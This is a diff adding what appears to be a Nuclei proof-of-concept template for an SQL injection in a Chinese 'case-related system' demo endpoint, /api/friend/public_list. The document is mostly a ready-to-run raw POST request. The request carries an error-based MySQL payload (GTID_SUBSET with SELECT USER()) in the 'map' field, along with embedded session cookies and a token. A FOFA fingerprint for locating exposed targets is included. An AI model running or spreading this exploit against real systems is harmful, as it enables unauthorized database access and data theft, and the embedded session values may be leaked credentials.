@@ -1,0 +1,70 @@
+id: poc-nt2x3vkfmsgxzzwa
+info:
+  name: 叮叮演示版某涉案系统public_list存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nt2x3vkfmsgxzzwa'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: nt2x3vkfmsgxzzwa
+    fofa: 'header="Access-Control-Allow-Headers: x-requested-with,content-type,x-csrf'
+http:
+- raw:
+  - 'POST /api/friend/public_list HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Length: 61
+
+    Cache-Control: max-age=0
+
+    Origin: http://
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (
+
+    KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,i
+
+    mage/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Referer: http:///api/friend/public_list
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
+
+    Cookie: 62cc888024db5cd9fe2616dbdb570ce8_ssl=f9d5c91f-0552-4800-bb53-92da4
+
+    d3c83a0.QZ4vqVD-i5cUriczmd1HWlrCtcI; d084e5ba280970da63882d7b0c3f9915_ssl=
+
+    4b739dfe-6b80-43ee-883e-bd9fac55512d.J7u2JOhEuZEHO65-8K8Utzcl5BA; 9389eaca
+
+    2f55feb7d69e0d4eb92d45a4_ssl=30399186-6446-4345-bf5c-7d7059932ce6.sB-ndYd3
+
+    He2-6K6p0vueoxrtRfU; fb69df26874bc1bcb8947bfaff066ff2_ssl=f8857eee-652c-40
+
+    5b-9528-905002bc1301.cajjuAtM7-QwTTrh3cNO1qHKt0w; 0ac4cd671fd8f190275812dc
+
+    89d10cdb_ssl=7fa46b60-7945-4e17-90fe-2821db764c3e.2xMR6KQcY-8B0c_CMyWJasxE
+
+    hho; token=01d1bcf0-7c49-46b8-ab4a-d8a803eb9152; ad763735c2927a18cbffb7cf3
+
+    8a518ca_ssl=1b18d601-2200-4fef-8172-968b04868eda.nwFFZt3QGADnSdEI2HxIFcqnW
+
+    08
+
+    Connection: close
+
+
+    uid=1&map=GTID_SUBSET(CONCAT((SELECT (USER()))),4675)&limit=1'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
